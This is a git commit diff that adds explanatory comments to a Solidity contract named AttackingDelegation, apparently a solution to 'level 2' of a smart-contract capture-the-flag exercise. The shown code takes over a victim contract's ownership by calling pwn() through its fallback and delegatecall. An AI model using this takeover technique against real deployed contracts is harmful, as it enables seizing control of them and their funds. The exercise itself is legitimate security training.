3a46750a48615933f3354ac102bcc6475cc2f4e6
Francesco Colleoni <wolfra@gmail.com>
2022-07-07 18:31:27 +0200

    Adds comments to solution of level 2.

--- contracts/2. Delegation/AttackingDelegation.sol
+++ contracts/2. Delegation/AttackingDelegation.sol
@@ -11,6 +11,9 @@ contract AttackingDelegation {
     }
 
     function hackContract() external {
+        // Just call function "pwn" with low level "call" function.
+        // This will trigger fallback function of Delegation, which will trigger "pwn" function on Delegation's delegate.
+        // Function "pwn" will then set the owner to the original caller (this contract);
         (bool success,) = contractAddress.call(abi.encodeWithSignature("pwn()"));
         console.log("result of call to victim contract method pwn():", success);
     }
